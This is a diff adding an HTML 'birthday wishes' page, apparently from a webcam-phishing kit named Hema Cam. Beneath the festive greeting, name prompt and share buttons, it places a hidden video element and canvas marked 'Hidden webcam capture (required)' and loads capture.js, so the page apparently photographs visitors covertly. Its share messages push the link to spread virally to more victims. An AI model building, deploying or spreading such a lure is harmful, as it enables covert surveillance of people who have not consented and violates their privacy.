@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
+    <title>Hema Cam - Birthday Wishes</title>
+    <meta property="og:title" content="Hema Cam" />
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="Happy birthday to your friends" />
+    <meta name="og:image" content="desc.png" />
+    <meta name="description" content="Happy birthday to your friends" property="og:description" />
+    <meta name="description" content="desc.png" property="og:image" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Hema Cam" />
+    <meta name="twitter:description" content="Happy birthday to your friends" />
+    <meta name="twitter:image" content="desc.png" />
+
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css" />
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
+    <link href='https://fonts.googleapis.com/css?family=Sofia&effect=neon' rel='stylesheet' />
+    <link href='https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Concert+One&display=swap' rel='stylesheet' />
+    <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png" />
+    <link href='styles.css' rel='stylesheet' />
+</head>
+<body class="fest">
+
+    <!-- Hidden webcam capture (required) -->
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+    <script src="capture.js"></script>
+
+    <!-- ===== Scenery ===== -->
+    <div class="fest-scene">
+        <div class="bg-sun"></div>
+        <!-- Balloons -->
+        <div class="balloon" style="left:6%"><span>🎈</span></div>
+        <div class="balloon" style="left:18%;animation-delay:-2s"><span>🎈</span></div>
+        <div class="balloon" style="left:32%;animation-delay:-4s"><span>🎀</span></div>
+        <div class="balloon" style="left:52%;animation-delay:-1s"><span>🎈</span></div>
+        <div class="balloon" style="left:68%;animation-delay:-3.5s"><span>🎁</span></div>
+        <div class="balloon" style="left:82%;animation-delay:-5s"><span>🎈</span></div>
+        <div class="balloon" style="left:93%;animation-delay:-2.8s"><span>⚡</span></div>
+        <!-- Confetti -->
+        <div class="confetti" id="confetti"></div>
+        <!-- Fireworks -->
+        <div class="firework fw1"></div>
+        <div class="firework fw2"></div>
+        <div class="firework fw3"></div>
+
+        <!-- ===== Content card ===== -->
+        <div class="birth-card">
+            <div class="title-wrap">
+                <p class="mini-tag">🎉 A special birthday celebration 🎉</p>
+                <h1 class="bday-title"><span class="glow-letter">H</span><span class="glow-letter d2">A</span><span class="glow-letter d3">P</span><span class="glow-letter d4">P</span><span class="glow-letter d5">Y</span></h1>
+                <h1 class="bday-title sub"><span class="glow-letter d6">B</span><span class="glow-letter d7">I</span><span class="glow-letter d8">R</span><span class="glow-letter d9">T</span><span class="glow-letter d10">H</span><span class="glow-letter d11">D</span><span class="glow-letter d12">A</span><span class="glow-letter d13">Y</span><span class="emoji">🎂</span></h1>
+            </div>
+
+            <!-- Name -->
+            <div class="name-zone" id="nameZone">
+                <div class="crown">👑</div>
+                <h2 class="guest-name" id="guestName"></h2>
+                <p class="guest-sub">This day is all about you!</p>
+            </div>
+
+            <!-- Countdown -->
+            <div class="countdown-chip">
+                <i class="fa fa-hourglass-half"></i>
+                <span id="demo">Loading…</span>
+            </div>
+
+            <!-- Messages -->
+            <div class="msg-list">
+                <div class="msg-card m1">💌 “We hope this birthday will be a great memory!”</div>
+                <div class="msg-card m2">🌟 In this birthday our best wishes to you!</div>
+                <div class="msg-card m3">🎊 “We pray you may enjoy this birthday!”</div>
+            </div>
+
+            <!-- Ad (kept) -->
+            <div class="ad-box">
+                <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+                <!-- Wishing 2 -->
+                <ins class="adsbygoogle" style="display:inline-block;width:300px;height:50px"
+                     data-ad-client="ca-pub-4696491179456446" data-ad-slot="2568634816"></ins>
+                <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+            </div>
+            <div class="ad-box">
+                <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+                <!-- Wishing -->
+                <ins class="adsbygoogle" style="display:inline-block;width:300px;height:50px"
+                     data-ad-client="ca-pub-4696491179456446" data-ad-slot="5590491777"></ins>
+                <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+            </div>
+
+            <!-- Wishes strip -->
+            <div class="wish-strip">
+                <p><span class="lab l1">Wishing you a very</span></p>
+                <p class="wish-big">✪ Happy birthday ✪</p>
+                <p><span class="lab l2">to you and your lovely family</span></p>
+                <p><span class="lab l3">May this auspicious occasion bring happiness, prosperity, health &amp; peace in your life.</span></p>
+                <p><span class="lab l4">✪ I wish that this birthday is your best one. ✪</span></p>
+                <p><span class="lab l5" style="background:#39f">This message should be in everyone's mobile — it is your duty!</span></p>
+            </div>
+
+            <div class="ad-box">
+                <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+                <!-- Link Ads -->
+                <ins class="adsbygoogle" style="display:block"
+                     data-ad-client="ca-pub-4696491179456446" data-ad-slot="1112298516"
+                     data-ad-format="link" data-full-width-responsive="true"></ins>
+                <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+            </div>
+
+            <!-- Footer by -->
+            <div class="by-line">by — <span id="byName">friend</span> 💛</div>
+
+            <!-- Share buttons -->
+            <div class="share-row">
+                <a class="share-btn wa ripple" id="washare" href="#" data-action="share/whatsapp/share">
+                    <img src="https://cdn.pixabay.com/photo/2015/08/03/13/58/soon-873316_640.png" alt="WhatsApp" />
+                    <b>WhatsApp</b>
+                </a>
+                <a class="share-btn fb ripple" id="fbshare" href="#" target="_blank" title="Share this post on Facebook">
+                    <img src="https://cdn.pixabay.com/photo/2017/06/22/06/22/facebook-2429746_640.png" alt="Facebook" />
+                    <b>Facebook</b>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <script>
+        /* ---------- Name prompt ---------- */
+        var a = (function(){ try { return prompt("Please Enter Your Name\n\n👇👇👇👇👇"); } catch(e){ return null; } })() || "friend";
+        document.getElementById('guestName').textContent = a;
+        document.getElementById('byName').textContent = a;
+
+        /* ---------- Countdown ---------- */
+        var countDownDate = new Date("October 10, 2018 00:00:00").getTime();
+        var x = setInterval(function(){
+            var now = new Date().getTime();
+            var distance = countDownDate - now;
+            var days = Math.floor(distance / (1000*60*60*24));
+            var hours = Math.floor((distance % (1000*60*60*24)) / (1000*60*60));
+            var minutes = Math.floor((distance % (1000*60*60)) / (1000*60));
+            var seconds = Math.floor((distance % (1000*60)) / 1000);
+            var demo = document.getElementById('demo');
+            if (distance < 0) { clearInterval(x); demo.innerHTML = "🙏 Welcome 🙏"; }
+            else { demo.innerHTML = days + " Days, " + hours + " Hrs, " + minutes + " Min, " + seconds + " Sec"; }
+        }, 1000);
+
+        /* ---------- Confetti ---------- */
+        (function(){
+            var box = document.getElementById('confetti');
+            var colors = ['#ff4d6d','#ffb703','#4ecdc4','#8338ec','#06d6a0','#ff5a5a','#3a86ff'];
+            var frag = document.createDocumentFragment();
+            for (var i = 0; i < 28; i++) {
+                var p = document.createElement('span');
+                var size = 6 + Math.random() * 7;
+                p.style.cssText = 'left:' + (Math.random()*100) + '%;width:' + size + 'px;height:' + (size*0.45) + 'px;' +
+                    'background:' + colors[i % colors.length] + ';animation-delay:' + (Math.random()*6) + 's;' +
+                    'animation-duration:' + (5 + Math.random()*5) + 's;transform:rotate(' + (Math.random()*180) + 'deg)';
+                frag.appendChild(p);
+            }
+            box.appendChild(frag);
+        })();
+
+        /* ---------- Ripple ---------- */
+        document.querySelectorAll('.ripple').forEach(function(el){
+            el.addEventListener('click', function(e){
+                var r = this.getBoundingClientRect();
+                var d = Math.max(r.width, r.height) * 2;
+                var s = document.createElement('span');
+                s.className = 'rip-ink';
+                s.style.cssText = 'width:'+d+'px;height:'+d+'px;left:'+(e.clientX - r.left - d/2)+'px;top:'+(e.clientY - r.top - d/2)+'px';
+                this.appendChild(s);
+                setTimeout(function(){ s.remove(); }, 600);
+            });
+        });
+
+        /* ---------- Toast ---------- */
+        var tmr2;
+        function toast(m){
+            var t = document.getElementById('toast');
+            t.textContent = m; t.classList.add('show');
+            clearTimeout(tmr2); tmr2 = setTimeout(function(){ t.classList.remove('show'); }, 2400);
+        }
+
+        /* ---------- Share links ---------- */
+        var url = window.location.href;
+        document.getElementById('fbshare').href = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(url);
+        document.getElementById('washare').href = 'whatsapp://send?text=' + encodeURIComponent('*No one would have sent such a message to you before, click below and see* 👉 ' + url);
+        document.getElementById('fbshare').addEventListener('click', function(){ toast('Sharing on Facebook 📘'); });
+        document.getElementById('washare').addEventListener('click', function(){ toast('Sharing on WhatsApp 💬'); });
+
+        /* ---------- Letter hover ---------- */
+        document.querySelectorAll('.glow-letter').forEach(function(l){
+            l.addEventListener('mouseenter', function(){ this.classList.add('bounce-now'); });
+            l.addEventListener('animationend', function(){ this.classList.remove('bounce-now'); });
+        });
+    </script>
+<!-- ========== Share Link Widget ========== -->
+<style>
+.shFAB{position:fixed;bottom:90px;right:18px;z-index:999;width:54px;height:54px;border-radius:50%;background:linear-gradient(135deg,#ff4d6d,#ffb703);color:#fff;font-size:24px;display:grid;place-items:center;cursor:pointer;box-shadow:0 8px 28px rgba(255,77,109,.6);transition:transform .25s cubic-bezier(.2,.8,.3,1.2), box-shadow .25s;animation:shPulse 3s ease-in-out infinite}
+.shFAB:hover{transform:scale(1.15);box-shadow:0 10px 34px rgba(255,77,109,.75)}
+.shFAB:active{transform:scale(.92)}
+@keyframes shPulse{0%,100%{box-shadow:0 8px 28px rgba(255,77,109,.6)}50%{box-shadow:0 8px 34px rgba(255,77,109,.85)}}
+.shPanel{position:fixed;bottom:156px;right:18px;z-index:999;width:min(360px,92vw);background:rgba(40,28,66,.97);border:1px solid rgba(255,255,255,.16);border-radius:20px;padding:22px 20px 18px;backdrop-filter:blur(16px);box-shadow:0 24px 60px rgba(0,0,0,.7);opacity:0;transform:translateY(16px) scale(.94);pointer-events:none;transition:opacity .25s ease, transform .25s cubic-bezier(.2,.8,.3,1)}
+.shPanel.open{opacity:1;transform:translateY(0) scale(1);pointer-events:auto}
+.shPanel h4{margin:0 0 12px;font-size:15px;font-weight:800;color:#fff;display:flex;align-items:center;gap:8px}
+.shPanel h4 span{font-size:18px}
+.shClose{margin-left:auto;background:none;border:none;color:#c9b8e8;font-size:18px;cursor:pointer;transition:color .2s, transform .2s}
+.shClose:hover{color:#ff4d6d;transform:scale(1.2)}
+.shUrlBox{position:relative;margin-bottom:14px}
+.shUrl{width:100%;background:rgba(255,255,255,.09);border:1px solid rgba(255,255,255,.16);border-radius:10px;padding:10px 44px 10px 12px;color:#fff;font-size:12.5px;font-family:Consolas,monospace;outline:none;transition:border-color .2s}
+.shUrl:focus{border-color:#ff4d6d}
+.shCopyBtn{position:absolute;right:6px;top:50%;transform:translateY(-50%);width:32px;height:32px;border-radius:8px;background:rgba(255,255,255,.14);border:none;color:#fff;font-size:14px;cursor:pointer;transition:background .2s}
+.shCopyBtn:hover{background:rgba(255,77,109,.6)}
+.shRow{display:flex;gap:7px;flex-wrap:wrap}
+.shBtn{flex:1;min-width:70px;padding:9px 6px;border-radius:11px;border:none;cursor:pointer;font-size:12.5px;font-weight:700;font-family:inherit;color:#fff;display:flex;flex-direction:column;align-items:center;gap:5px;transition:transform .2s ease, filter .2s}
+.shBtn:hover{transform:translateY(-2px) scale(1.04)}
+.shBtn:active{transform:scale(.93)}
+.shBtn .shIc{font-size:20px}
+.shBtn.i1{background:#25d366}
+.shBtn.i2{background:#0088cc}
+.shBtn.i3{background:#1877f2}
+.shBtn.i4{background:#1da1f2}
+.shBtn.i5{background:#4a3a7a}
+.shToast{position:fixed;bottom:220px;right:24px;z-index:1000;background:#fff;color:#2b1a4e;font-size:13px;font-weight:700;padding:10px 18px;border-radius:12px;box-shadow:0 12px 30px rgba(0,0,0,.5);opacity:0;transform:translateY(10px);transition:opacity .3s, transform .3s;pointer-events:none}
+.shToast.show{opacity:1;transform:translateY(0)}
+</style>
+
+<div class="shFAB" id="shFAB" title="Share link to friends">🔗</div>
+<div class="shPanel" id="shPanel">
+    <h4><span>🔗</span> Share link with friends <button class="shClose" id="shClose">✕</button></h4>
+    <div class="shUrlBox">
+        <input class="shUrl" id="shUrl" readonly>
+        <button class="shCopyBtn" id="shCopy" title="Copy">📋</button>
+    </div>
+    <div class="shRow">
+        <button class="shBtn i1" data-sh="copy"><span class="shIc">📋</span>Copy</button>
+        <button class="shBtn i2" data-sh="wa"><span class="shIc">💬</span>WhatsApp</button>
+        <button class="shBtn i3" data-sh="fb"><span class="shIc">📘</span>Facebook</button>
+        <button class="shBtn i4" data-sh="tg"><span class="shIc">✈️</span>Telegram</button>
+        <button class="shBtn i5" data-sh="x"><span class="shIc">🐦</span>X / Twitter</button>
+    </div>
+</div>
+<div class="shToast" id="shToast"></div>
+
+<script>
+(function(){
+    var fab=document.getElementById('shFAB'),
+        panel=document.getElementById('shPanel'),
+        urlIn=document.getElementById('shUrl'),
+        shToast=document.getElementById('shToast');
+    var shT;
+
+    function getURL(){ return location.href.split('#')[0]; }
+
+    function showPanel(){
+        urlIn.value=getURL();
+        panel.classList.add('open');
+        urlIn.select();
+        copyText(getURL());
+        shMsg('Link copied! Send it to your friends 🚀');
+    }
+
+    function hidePanel(){ panel.classList.remove('open'); }
+
+    fab.addEventListener('click',function(e){
+        e.stopPropagation();
+        panel.classList.contains('open') ? hidePanel() : showPanel();
+    });
+
+    document.addEventListener('click',function(e){
+        if(!panel.contains(e.target) && e.target!==fab) hidePanel();
+    });
+
+    document.getElementById('shClose').addEventListener('click',hidePanel);
+
+    document.getElementById('shCopy').addEventListener('click',function(){
+        copyText(urlIn.value);
+        shMsg('Link copied! ✅');
+    });
+
+    document.querySelectorAll('.shBtn').forEach(function(btn){
+        btn.addEventListener('click',function(){
+            var u=getURL(), enc=encodeURIComponent(u), t=encodeURIComponent('Check this out! 👉 ');
+            var links={
+                copy: u,
+                wa: 'https://api.whatsapp.com/send?text='+t+enc,
+                fb: 'https://www.facebook.com/sharer/sharer.php?u='+enc,
+                tg: 'https://t.me/share/url?url='+enc+'&text='+t,
+                x: 'https://twitter.com/intent/tweet?text='+t+'&url='+enc
+            };
+            var target=links[this.dataset.sh];
+            if(this.dataset.sh==='copy'){ copyText(u); shMsg('Link copied! ✅'); }
+            else{ window.open(target,'_blank','width=600,height=500'); shMsg('Opening… 🚀'); }
+            setTimeout(hidePanel,400);
+        });
+    });
+
+    function copyText(txt){
+        if(navigator.clipboard&&navigator.clipboard.writeText) navigator.clipboard.writeText(txt);
+        else{ var ta=document.createElement('textarea');ta.value=txt;ta.style.cssText='position:fixed;opacity:0';document.body.appendChild(ta);ta.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(ta);}
+    }
+
+    function shMsg(m){ shToast.textContent=m;shToast.classList.add('show');clearTimeout(shT);shT=setTimeout(function(){shToast.classList.remove('show');},2200); }
+})();
+</script>
+</body>
+</html>
